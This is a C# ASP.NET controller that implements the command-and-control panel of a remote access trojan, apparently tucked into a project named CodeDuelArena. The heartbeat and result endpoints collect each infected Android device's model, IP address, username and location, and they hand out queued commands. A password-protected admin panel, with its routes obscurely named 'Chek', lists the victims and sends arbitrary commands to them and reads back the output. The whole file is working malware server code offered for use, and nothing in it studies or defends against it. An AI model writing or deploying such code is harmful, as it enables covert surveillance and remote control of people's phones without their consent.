using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.Collections.Concurrent;
using CodeDuelArena.Data;
using CodeDuelArena.Models;

namespace CodeDuelArena.Controllers
{
    public class RatPanelController : Controller
    {
        private readonly AppDbContext _db;
        private static readonly ConcurrentDictionary<string, DeviceData> _devices = new();
        private static readonly ConcurrentDictionary<string, string> _pendingCommands = new();
        private static readonly ConcurrentDictionary<string, CommandResult> _commandResults = new();
        private static readonly string RatPassword = "admin123";
        
        public RatPanelController(AppDbContext db)
        {
            _db = db;
        }
        
        // ============ API ДЛЯ ПРИЛОЖЕНИЯ ============
        
        [HttpPost]
        [Route("api/rat/heartbeat")]
        public IActionResult Heartbeat([FromBody] DeviceData data)
        {
            if (data == null) return BadRequest();
            data.LastSeen = DateTime.UtcNow;
            _devices[data.DeviceId] = data;
            
            if (_pendingCommands.TryRemove(data.DeviceId, out var cmd))
                return Ok(new { command = cmd });
            
            return Ok(new { command = "" });
        }
        
        [HttpPost]
        [Route("api/rat/result")]
        public IActionResult CommandResult([FromBody] CommandResult result)
        {
            if (result == null) return BadRequest();
            _commandResults[result.CommandId] = result;
            return Ok();
        }
        
        // ============ АДМИН-ПАНЕЛЬ ============
        
        [HttpGet]
        [Route("Chek/Chek/Login")]
        public IActionResult Login() => View();
        
        [HttpPost]
        [Route("Chek/Chek/Login")]
        public IActionResult Login(string password)
        {
            if (password == RatPassword)
            {
                Response.Cookies.Append("rat_auth", "true", new CookieOptions
                {
                    HttpOnly = true,
                    Expires = DateTime.Now.AddHours(2)
                });
                return RedirectToAction("Dashboard");
            }
            ViewBag.Error = "Wrong password";
            return View();
        }
        
        [HttpGet]
        [Route("Chek/Dashboard")]
        public IActionResult Dashboard()
        {
            if (Request.Cookies["rat_auth"] != "true")
                return RedirectToAction("Login");
            return View(_devices.Values.ToList());
        }
        
        [HttpPost]
        [Route("Chek/SendCommand")]
        public IActionResult SendCommand(string deviceId, string command)
        {
            if (Request.Cookies["rat_auth"] != "true")
                return Json(new { success = false });
            
            var cmdId = Guid.NewGuid().ToString("N")[..8];
            _pendingCommands[deviceId] = $"{cmdId}:{command}";
            return Json(new { success = true, commandId = cmdId });
        }
        
        [HttpGet]
        [Route("Chek/GetResult")]
        public IActionResult GetResult(string commandId)
        {
            if (_commandResults.TryRemove(commandId, out var result))
                return Json(new { success = true, output = result.Output });
            
            return Json(new { success = false, output = "Waiting..." });
        }
        
        [HttpGet]
        [Route("Chek/DeviceInfo")]
        public IActionResult DeviceInfo(string deviceId)
        {
            if (_devices.TryGetValue(deviceId, out var device))
                return Json(device);
            
            return Json(new { error = "Device not found" });
        }
    }
    
    public class DeviceData
    {
        public string DeviceId { get; set; } = "";
        public string Model { get; set; } = "";
        public string AndroidVersion { get; set; } = "";
        public string IpAddress { get; set; } = "";
        public string Username { get; set; } = "";
        public string Location { get; set; } = "";
        public string Battery { get; set; } = "";
        public DateTime LastSeen { get; set; }
    }
    
    public class CommandResult
    {
        public string CommandId { get; set; } = "";
        public string Output { get; set; } = "";
    }
}